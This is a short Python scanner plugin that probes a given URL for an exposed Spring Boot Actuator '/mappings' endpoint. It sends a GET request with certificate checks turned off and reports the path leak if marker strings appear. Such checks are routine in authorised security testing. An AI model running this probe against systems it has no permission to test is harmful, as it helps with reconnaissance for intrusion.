#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: spring boot 路径泄露
referer: http://blog.csdn.net/u011687186/article/details/73457498
author: Lucifer
description: SpringBoot默认API会暴露出敏感接口
'''
import sys
import requests


class springboot_api_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/mappings"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if "resourceHandlerMapping" in req.text and r"springframework.boot.actuate" in req.text:
                return True,vulnurl,"spring boot 路径泄露",payload,req.text
            else:
                return False, None, None, None, None
        except:
            return False, None, None, None, None


if __name__ == "__main__":
    testVuln = springboot_api_BaseVerify(sys.argv[1])
    testVuln.run()
